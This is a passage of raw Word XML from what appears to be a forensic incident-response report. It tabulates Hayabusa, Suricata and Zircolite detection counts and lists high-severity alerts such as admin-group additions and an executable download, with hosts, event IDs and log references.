          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>252</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>450</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>211</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>42</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Zircolite</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Critical and high detections (to compare with the findings; a detection is not a finding until it has been qualified):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1361"/>
        <w:gridCol w:w="907"/>
        <w:gridCol w:w="737"/>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="624"/>
        <w:gridCol w:w="624"/>
        <w:gridCol w:w="1417"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Engine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Rule</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Channel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>EventID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>RecordID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-18 05:44:14.849000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suspicious Service Path</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>WIN-2IH1TBB9I4Q</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>7045</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>114</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#1319</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-18 05:46:40.050000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Added To Local Admin Grp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4732</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>180</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#791</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-18 05:49:08.012000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Added To Local Admin Grp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4732</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>371</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#792</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:16.235000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>User Added To Local Admin Grp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Sec</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>4732</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>980</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>hayabusa/hayabusa_0.jsonl#793</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:24:06.940653</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="907"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>Suricata</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>ET INFO PE EXE or DLL Windows file download HTTP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>http</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2018959</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1780506546707033</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#317</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:25:19.071794</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10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2025644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1866613104919638</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>suricata/case001.pcap/eve_alert.jsonl#72</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1361"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2020-09-19 02:29:49.580408</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10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>failed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>2025644</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="624"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="12"/>
              </w:rPr>
              <w:t>1528333181178310</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
